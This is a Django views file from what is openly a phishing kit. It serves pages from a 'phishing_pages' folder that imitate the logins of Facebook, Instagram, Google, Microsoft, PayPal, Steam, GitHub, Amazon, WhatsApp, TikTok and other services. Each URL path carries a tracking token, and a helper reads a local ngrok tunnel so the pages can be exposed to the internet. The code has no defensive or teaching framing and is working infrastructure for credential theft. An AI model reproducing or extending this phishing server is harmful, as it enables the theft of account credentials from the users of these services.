from django.http import HttpResponse,JsonResponse
from django.shortcuts import render,redirect,HttpResponse
import json
import requests
from bs4 import BeautifulSoup

def index(request):
    return render(request,"home.html")

def ngrok_url(request):
    r = requests.get(f'http://localhost:4040/api/tunnels')

    return HttpResponse(r.content)
    

    # urllist = []
    # for i in range(0,2):
    #     try:
    #         r = requests.get(f'http://localhost:404{i}/api/tunnels')
    #         data = BeautifulSoup(r.content, 'html.parser')
    #         print(type(data))

    #         urllist.append("r.content")
    #     except:
    #         pass

    # return JsonResponse({"urllist":urllist})

def hunt_page(request):

    path = request.path
    token = path[5:]
    page_app = path[1:5]

    data = {"token":token,"page_app":page_app}

    if page_app == "face":
        return render(request, "phishing_pages/facebook/facebook.html", data)

    elif page_app == "facd":
        return render(request, "phishing_pages/facebook/facebook_desktop.html", data)

    elif page_app == "facm":
        return render(request, "phishing_pages/facebook/facebook_mobile.html", data)

    elif page_app == "mess":
        return render(request, "phishing_pages/facebook/messenger.html", data)

    elif page_app == "inst":
        return render(request, "phishing_pages/instagram/instagram.html", data)

    elif page_app == "insv":
        return render(request, "phishing_pages/instagram/instagram_verify.html", data)

    elif page_app == "snap":
        return render(request, "phishing_pages/snapchat.html", data)

    elif page_app == "twit":
        return render(request, "phishing_pages/twitter.html", data)

    elif page_app == "goog":
        return render(request, "phishing_pages/google.html", data)

    elif page_app == "micr":
        return render(request, "phishing_pages/microsoft.html", data)

    elif page_app == "free":
        return render(request, "phishing_pages/freefire.html", data)

    elif page_app == "pubg":
        return render(request, "phishing_pages/pubg.html", data)

    elif page_app == "netf":
        return render(request, "phishing_pages/netflix.html", data)

    elif page_app == "payp":
        return render(request, "phishing_pages/paypal.html", data)

    elif page_app == "stea":
        return render(request, "phishing_pages/steam.html", data)

    elif page_app == "word":
        return render(request, "phishing_pages/wordpress.html", data)

    elif page_app == "yaho":
        return render(request, "phishing_pages/yahoo.html", data)

    elif page_app == "gith":
        return render(request, "phishing_pages/github.html", data)

    elif page_app == "ajio":
        return render(request, "phishing_pages/ajio.html", data)

    elif page_app == "amaz":
        return render(request, "phishing_pages/amazon.html", data)

    elif page_app == "fili":
        return render(request, "phishing_pages/filipkart.html", data)

    elif page_app == "hots":
        return render(request, "phishing_pages/hotstar.html", data)

    elif page_app == "phon":
        return render(request, "phishing_pages/phonepay.html", data)

    elif page_app == "what":
        return render(request, "phishing_pages/whatsapp.html", data)

    elif page_app == "tele":
        return render(request, "phishing_pages/telegram.html", data)

    elif page_app == "tikt":
        return render(request, "phishing_pages/tiktok.html", data)

    else:
        return HttpResponse(f"token is {token} and app is {page_app}")




